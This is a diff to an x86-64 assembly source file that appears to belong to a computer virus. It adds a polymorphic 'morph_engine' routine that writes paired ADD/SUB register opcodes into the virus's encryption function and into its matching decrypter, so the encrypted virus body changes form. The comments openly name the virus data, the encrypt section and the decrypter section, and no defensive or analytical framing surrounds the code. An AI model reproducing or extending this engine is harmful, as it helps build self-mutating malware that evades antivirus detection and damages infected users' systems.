@@ -3,7 +3,12 @@
 global morph_engine
 
 
+%define OPCODE_ADD_REG 0x01
+%define OPCODE_SUB_REG 0x29
+
 section .data
+
+	ModRegRM  dd 0xD8, 0xC1
 
 section .text
 
@@ -20,10 +25,10 @@ push r14
 push r15
 
 ;save data of using registers
-mov [rbp-0x28], rdi
-mov [rbp-0x20], rsi
-mov [rbp-0x18],	rdx
-mov [rbp-0x10],	rcx
+mov [rbp-0x28], rdi ; virus data
+mov [rbp-0x20], rsi ; offset of encrypt section
+mov [rbp-0x18],	rdx ; size of virus in hexa
+mov [rbp-0x10],	rcx ; offset of decrypter section
 
 
 
@@ -45,13 +50,54 @@ mov rdx, 0x7
 call mprotect
 
 
-mov rbx, [rbp-0x28]
-mov rsi, [rbp-0x20]
-add rsi, rbx
-; rsi = full address of virus.start
-mov rdi, [rbp-0x18]
-add rdi, rsi
-; rdi = full address of the virus.end
+
+; set up needed values
+mov r12, .encryption_function
+mov rdi, .encryption_function
+add rdi, FUNC_SIZE
+sub rdi, 0x1
+mov r13, [rbp-0x28]
+add r13, [rbp-0x10] 
+add r13, FUNC_SIZE
+; end of 
+mov r15, ModRegRM
+
+
+
+.encrypt_logic_loop:
+	cmp r12, rdi
+	ja .encrypt_function_load_values
+
+
+
+
+
+.func_add_reg:
+	sub r13, 0x2
+	xor rax, rax
+	mov al, [r15]
+	xor rbx, rbx
+	mov bh, al
+	mov ah, OPCODE_ADD_REG
+	mov bl, OPCODE_SUB_REG
+	xchg al, ah
+	mov [r12], ax
+	mov [r13], bx
+	add r12, 0x2
+	jmp .encrypt_logic_loop
+
+
+
+
+.encrypt_function_load_values:
+
+	mov rbx, [rbp-0x28]
+	mov rsi, [rbp-0x20]
+	add rsi, rbx
+	; rsi = full address of virus.start
+	mov rdi, [rbp-0x18]
+	add rdi, rsi
+	; rdi = full address of the virus.end
 
 
 .encryption_loop:
@@ -62,7 +108,7 @@ add rdi, rsi
 	mov ebx, [rsi+0xC]
 
 .encryption_function:
-	times POLY_FUNC_SIZE db OPCODE_NOP
+	times FUNC_SIZE db OP_NOP
 	; put back the data to where it was taken from
 	mov [rsi], eax
 	mov [rsi+0x4], ecx
